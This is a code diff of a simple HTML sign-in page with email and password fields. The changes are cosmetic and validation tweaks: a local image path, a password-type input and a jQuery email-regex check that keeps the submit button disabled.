@@ -12,7 +12,7 @@
    <script src="https://swiftcourier.github.io/app.github.io/auth/scpt/jQuery-Plugin-For-Fitting-Text-To-Its-Container-textFit/textFit.min.js"></script>
    <link rel="stylesheet" href="css/style.css">
    <style>
-  html,
+      html,
       body {
          margin: 0px;
          padding: 0px;
@@ -115,28 +115,28 @@
    </span>
    <main id="bkground">
       <section id="tsect">
-         <img src="https://swiftcourier.github.io/app.github.io/auth/imgs/PngItem_5567529.png" width="70px" alt="" srcset="">
+         <img src="imgs/PngItem_5567529.png" width="70px" alt="" srcset="">
       </section>
       <section id="bsect">
          <div class="margin"></div>
          <div class="headtag">Hi there! </div>
          <div class="loginfield">
-            <form action="app" method="post">
+            <form action="app" method="post" id="validate">
                <div class="input-block">
-                  <input type="text" class="email" name="input-text" class="inp" placeholder="" id="input-text" required
-                     spellcheck="false">
+                  <input type="text" class="email" autocomplete="off" spellcheck="false" name="input-text" class="inp"
+                     placeholder="" id="input-text" required spellcheck="false">
                   <span class="placeholder">
                      Email
                   </span>
                </div>
                <div class="input-block">
-                  <input type="text" class="password" placeholder="" name="input-text" id="input-text" required
+                  <input type="password" class="password" placeholder="" name="input-text" id="input-text" required
                      spellcheck="false">
                   <span class="placeholder">
                      Password
                   </span>
                </div>
-               <input id="submit" type="submit" disabled="disabled" value="Sign in">
+               <input id="submit" disabled="disabled" type="submit" value="Sign in"> <!--  -->
             </form>
          </div>
          <div class="otptions"></div>
@@ -175,11 +175,13 @@
       })
 
       $(document).ready(function () {
-         $('input').keyup(function () {
+         var validRegex = /^[a-zA-Z0-9.!#$%&'*+/=?^_`{|}~-]+@[a-zA-Z0-9-]+(?:\.[a-zA-Z0-9-]+)*$/;
+         empty = true;
 
+         $('input').keyup(function () {
             var empty = false;
             $('input').each(function () {
-               if ($(this).val().length == 0 || $(this).val() == " ") {
+               if ($(this).val().length == 0 || $(this).val() == " " || !document.querySelector(".email").value.match(validRegex)) {
                   empty = true;
                }
             });
